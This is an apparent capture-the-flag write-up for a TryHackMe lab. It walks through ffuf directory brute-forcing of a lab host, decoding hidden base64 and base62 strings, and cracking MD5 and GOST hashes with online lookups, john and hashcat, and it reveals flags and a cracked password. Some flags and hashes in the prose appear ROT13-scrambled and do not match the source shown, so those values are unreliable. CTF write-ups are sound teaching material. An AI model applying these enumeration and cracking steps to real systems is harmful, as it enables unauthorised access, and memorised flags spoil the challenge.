+<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>queued<span class="w"> </span>job<span class="w"> </span>on<span class="w"> </span>target:<span class="w"> </span>http://10.10.24.106/hidden/FUZZ
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">390</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">47</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">19</span><span class="o">]</span>
+<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/hidden/index.html
+<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>index.html
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">390</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">47</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">19</span><span class="o">]</span>
+<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/hidden/
+<span class="w">    </span>*<span class="w"> </span>FUZZ:
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">301</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">169</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">8</span><span class="o">]</span>
+<span class="hll"><span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/hidden/whatever
+</span><span class="p">|</span><span class="w"> </span>--&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/hidden/whatever/
+<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>whatever
+
+<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>job<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>queue:<span class="w"> </span>http://10.10.24.106/hidden/whatever/FUZZ
+
+<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>queued<span class="w"> </span>job<span class="w"> </span>on<span class="w"> </span>target:<span class="w"> </span>http://10.10.24.106/hidden/whatever/FUZZ
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">435</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">47</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">22</span><span class="o">]</span>
+<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/hidden/whatever/index.html
+<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>index.html
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">435</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">47</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">22</span><span class="o">]</span>
+<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106/hidden/whatever/
+<span class="w">    </span>*<span class="w"> </span>FUZZ:
+
+::<span class="w"> </span>Progress:<span class="w"> </span><span class="o">[</span><span class="m">79752</span>/79752<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Job<span class="w"> </span><span class="o">[</span><span class="m">3</span>/3<span class="o">]</span><span class="w"> </span>::<span class="w"> </span><span class="m">762</span><span class="w"> </span>req/sec<span class="w"> </span>::<span class="w"> </span>Duration:<span class="w"> </span><span class="o">[</span><span class="m">0</span>:01:34<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Errors:<span class="w"> </span><span class="m">18</span><span class="w"> </span>::
+</code></pre></div></td></tr></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span></pre></div></td><td class="code"><div><pre><span></span><code>└─#<span class="w"> </span>ffuf<span class="w"> </span>-u<span class="w"> </span>http://10.10.24.106:65524/FUZZ<span class="w"> </span>-w<span class="w"> </span>/home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt<span class="w"> </span>-recursion<span class="w"> </span>-recursion-depth<span class="w"> </span><span class="m">5</span><span class="w"> </span>-c<span class="w"> </span>-fc<span class="w"> </span><span class="m">403</span><span class="w"> </span>-v<span class="w"> </span>-e<span class="w"> </span>.txt,.html<span class="w"> </span>-o<span class="w"> </span>enumeration/port65524<span class="w"> </span>-of<span class="w"> </span>all<span class="w">                           </span><span class="m">1</span><span class="w"> </span>⨯
+
+<span class="w">        </span>/<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span><span class="w">          </span>/<span class="err">&#39;</span>___<span class="se">\</span>
+<span class="w">    </span>/<span class="se">\ \_</span>_/<span class="w"> </span>/<span class="se">\ \_</span>_/<span class="w">  </span>__<span class="w">  </span>__<span class="w">  </span>/<span class="se">\ \_</span>_/
+<span class="w">    </span><span class="se">\ \ </span>,__<span class="se">\\</span><span class="w"> </span><span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\</span>
+<span class="w">        </span><span class="se">\ \ \_</span>/<span class="w"> </span><span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+<span class="w">        </span><span class="se">\ \_\ </span><span class="w">  </span><span class="se">\ \_\ </span><span class="w"> </span><span class="se">\ \_</span>___/<span class="w">  </span><span class="se">\ \_\</span>
+<span class="w">        </span><span class="se">\/</span>_/<span class="w">    </span><span class="se">\/</span>_/<span class="w">   </span><span class="se">\/</span>___/<span class="w">    </span><span class="se">\/</span>_/
+
+<span class="w">    </span>v1.3.1<span class="w"> </span>Kali<span class="w"> </span>Exclusive<span class="w"> </span>&lt;<span class="m">3</span>
+________________________________________________
+
+::<span class="w"> </span>Method<span class="w">           </span>:<span class="w"> </span>GET
+::<span class="w"> </span>URL<span class="w">              </span>:<span class="w"> </span>http://10.10.24.106:65524/FUZZ
+::<span class="w"> </span>Wordlist<span class="w">         </span>:<span class="w"> </span>FUZZ:<span class="w"> </span>/home/bonzo/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+::<span class="w"> </span>Extensions<span class="w">       </span>:<span class="w"> </span>.txt<span class="w"> </span>.html
+::<span class="w"> </span>Output<span class="w"> </span>file<span class="w">      </span>:<span class="w"> </span>enumeration/port65524.<span class="o">{</span>json,ejson,html,md,csv,ecsv<span class="o">}</span>
+::<span class="w"> </span>File<span class="w"> </span>format<span class="w">      </span>:<span class="w"> </span>all
+::<span class="w"> </span>Follow<span class="w"> </span>redirects<span class="w"> </span>:<span class="w"> </span><span class="nb">false</span>
+::<span class="w"> </span>Calibration<span class="w">      </span>:<span class="w"> </span><span class="nb">false</span>
+::<span class="w"> </span>Timeout<span class="w">          </span>:<span class="w"> </span><span class="m">10</span>
+::<span class="w"> </span>Threads<span class="w">          </span>:<span class="w"> </span><span class="m">40</span>
+::<span class="w"> </span>Matcher<span class="w">          </span>:<span class="w"> </span>Response<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>,204,301,302,307,401,403,405
+::<span class="w"> </span>Filter<span class="w">           </span>:<span class="w"> </span>Response<span class="w"> </span>status:<span class="w"> </span><span class="m">403</span>
+________________________________________________
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">10818</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">3441</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">371</span><span class="o">]</span>
+<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106:65524/index.html
+<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>index.html
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">153</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">13</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">7</span><span class="o">]</span>
+<span class="hll"><span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106:65524/robots.txt
+</span><span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>robots.txt
+
+<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">10818</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">3441</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">371</span><span class="o">]</span>
+<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.24.106:65524/
+<span class="w">    </span>*<span class="w"> </span>FUZZ:
+
+::<span class="w"> </span>Progress:<span class="w"> </span><span class="o">[</span><span class="m">79752</span>/79752<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Job<span class="w"> </span><span class="o">[</span><span class="m">1</span>/1<span class="o">]</span><span class="w"> </span>::<span class="w"> </span><span class="m">882</span><span class="w"> </span>req/sec<span class="w"> </span>::<span class="w"> </span>Duration:<span class="w"> </span><span class="o">[</span><span class="m">0</span>:01:33<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Errors:<span class="w"> </span><span class="m">6</span><span class="w"> </span>::
+</code></pre></div></td></tr></table></div>
+</div>
+</div>
+</div>
+<h3 id="web-walking">Web Walking</h3>
+<h4 id="port-80">Port 80</h4>
+<p><strong>HTML source of  <code>index.html</code> in folder <code>/hidden/whatever</code></strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>dead end<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="nt">body</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="w"> </span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">background-repeat</span><span class="p">:</span><span class="w"> </span><span class="kc">no-repeat</span><span class="p">;</span>
+<span class="w">    </span><span class="k">background-size</span><span class="p">:</span><span class="w"> </span><span class="kc">cover</span><span class="p">;</span>
+<span class="w">        </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="mi">35</span><span class="kt">em</span><span class="p">;</span>
+<span class="w">        </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="kc">auto</span><span class="p">;</span>
+<span class="w">        </span><span class="k">font-family</span><span class="p">:</span><span class="w"> </span><span class="n">Tahoma</span><span class="p">,</span><span class="w"> </span><span class="n">Verdana</span><span class="p">,</span><span class="w"> </span><span class="n">Arial</span><span class="p">,</span><span class="w"> </span><span class="kc">sans-serif</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+<span class="hll"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">hidden</span><span class="p">&gt;</span>ZmxhZ3tmMXJzN19mbDRnfQ==<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div></td></tr></table></div>
+<h4 id="port-65524">Port 65524</h4>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:3"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><input id="__tabbed_3_3" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">robots.txt</label><label for="__tabbed_3_2">index.html (line 194)</label><label for="__tabbed_3_3">index.html (line 294)</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>User-Agent:*
+Disallow:/
+Robots Not Allowed
+<span class="hll">User-Agent:a18672860d0510e5ab6699730763b250
+</span>Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+</code></pre></div></td></tr></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;main_page&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;page_header floating_element&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/icons/openlogo-75.png&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;Debian Logo&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;floating_element&quot;</span><span class="p">/&gt;</span>
+        <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;floating_element&quot;</span><span class="p">&gt;</span>
+          Apache 2 It Works For Me
+<span class="hll">            <span class="p">&lt;</span><span class="nt">p</span> <span class="na">hidden</span><span class="p">&gt;</span>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span>        <span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></div></td></tr></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>
+    They are activated by symlinking available
+    configuration files from their respective
+<span class="hll">    Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
+</span>    *-available/ counterparts. These should be managed
+    by using our helpers
+        <span class="p">&lt;</span><span class="nt">tt</span><span class="p">&gt;</span>
+</code></pre></div></td></tr></table></div>
+</div>
+</div>
+</div>
+<h4 id="indexhtml-in-folder-n0th1ng3ls3m4tt3r">index.html in folder /n0th1ng3ls3m4tt3r</h4>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>random title<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="nt">body</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="w"> </span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">background-color</span><span class="p">:</span><span class="kc">black</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+<span class="hll"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;binarycodepixabay.jpg&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;140px&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;140px&quot;</span><span class="p">/&gt;</span>
+</span><span class="hll"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div></td></tr></table></div>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="webserver-nginx-on-port-80">Webserver <code>nginx</code> on port 80</h3>
+<p>In the HTML source of  <code>index.html</code> in the folder <code>/hidden/whatever</code> on port 80 we find a <a href="https://www.hannesholst.com/blog/how-to-identify-a-base64-encoded-string/">base64</a> encoded string. </p>
+<p>We can easily decode it in the terminal and get the first flag:
+<code>echo MzkuM3gzZKWmA19zoQEasD== | base64 -d</code> </p>
+<p>Result: <code>synt{s1ef7_sy4t}</code></p>
+<h3 id="webserver-apache-on-port-65524">Webserver <code>apache</code> on port 65524</h3>
+<h4 id="robotstxt-in-root-folder"><code>robots.txt</code> in root folder</h4>
+<p>The string in the <code>robots.txt</code> is probably a <a href="https://infosecscout.com/identify-md5-hash/">md5</a> hash. It has hexadecimal characters and is 32 characters long</p>
+<p><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>srv001:/home/bonzo<span class="w"> </span><span class="c1"># echo -n n18672860q0510r5no6699730763o250 | wc -c 32</span>
+</code></pre></div></td></tr></table></div>
+We can also check it with the tool <code>hash-identifier</code>:</p>
+<p><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span></pre></div></td><td class="code"><div><pre><span></span><code>┌──(root💀kali)-[~/ctf/thm/easypeasy]
+└─# hash-identifier n18672860q0510r5no6699730763o250  
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+
+Possible Hashs:
+[+] MD5
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+</code></pre></div></td></tr></table></div>
+Trying to crack it with the downloadable <code>easypeasy.txt</code> isn't succesfull so we have to try and hope an online tool has the hash in it's database. 
+Another way could be to simply paste the string in the google searchbar but that would result in write-ups as well and we don't want that for now. So we search google with <code>decrypt md5 hash</code></p>
+<p>The third entry is able to decrypt the hash.</p>
+<p><a href="https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250">https://md5hashing.net</a> gives us the second flag<code>synt{1z_f3p0aq_sy4t}</code></p>
+<h4 id="flag-in-indexhtml-in-root-folder">flag in <code>index.html</code> in root folder</h4>
+<p>The <code>index.html</code> is seemingly a default apache page but with two entries that are not included in a standard default apache page.
+The first entry is flag3 and we can find it in clear sight on the page.
+The second entry is hidden in the source code:
+<code>its encoded with ba....:BofWzC173A2K6qBeNtRNY0Ih</code> 
+The hiny is that it's encoded in "ba". It could be some base64 or similar encoding. The easiest way to check that out is with <a href="https://gchq.github.io/CyberChef/">cyberchef</a>.
+We try <code>base64</code> but the output makes no sense. So we try the other base(n) encodings until we get an output that makes sense, in this case <code>base62</code></p>
+<p><img alt="image-7" src="../image-7.png" /></p>
+<p>The result looks like a folder and adding it to the <code>IP:PORT</code> in the browser we can confirm it's a new, hidden folder </p>
+<h4 id="string-in-indexhtml-in-folder-n0th1ng3ls3m4tt3r">string in index.html in folder /n0th1ng3ls3m4tt3r</h4>
+<p>In the source of index.html in the newly discovered folder <code>/n0th1ng3ls3m4tt3r</code> we find the string <code>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</code></p>
+<p><code>hash-identifier</code> says it's probably <code>sha256</code></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>--------------------------------------------------
+ HASH: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+
+Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+</code></pre></div></td></tr></table></div>
+<p>But <code>hash-identifier</code> was wrong here. It's GOST, a Russian cryptography function</p>
+<p><a href="https://en.wikipedia.org/wiki/GOST">GOST(hash function)</a></p>
+<p>If we use the homepage we cracked the md5 before, we get the result and the correct identification</p>
+<p>https://md5hashing.net/hash/gost/940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
+<p>the decrypted result is <code>mypasswordforthatjob</code></p>
+<p>We could have used the hint as well and crack it with the format <code>gost</code></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>└─# john --wordlist=easy.txt --format=gost hash.txt                                                                                                                                                                                                       1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
+Will run 2 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+mypasswordforthatjob (?)     
+1g 0:00:00:00 DONE (2021-11-30 20:34) 33.33g/s 136533p/s 136533c/s 136533C/s mypasswordforthatjob..flash88
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></td></tr></table></div>
+<p>Or, now that we now the function, <code>gost</code>, we can use hashcat as well</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span></pre></div></td><td class="code"><div><pre><span></span><code>┌──(root💀kali)-[~/ctf/thm/easypeasy]
+└─# hashcat -a 0 -m 6900 -O hash.txt easy.txt                                                                                                                                                                                                           130 ⨯
+
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: pthread-AMD Ryzen 5 2600 Six-Core Processor, 2883/2947 MB (1024 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 32
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 64 MB
+
+Dictionary cache hit:
+* Filename..: easy.txt
+* Passwords.: 5140
+* Bytes.....: 43708
+* Keyspace..: 5140
+
+940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81:mypasswordforthatjob
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: GOST R 34.11-94
+Hash.Target......: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d14...e6fd81
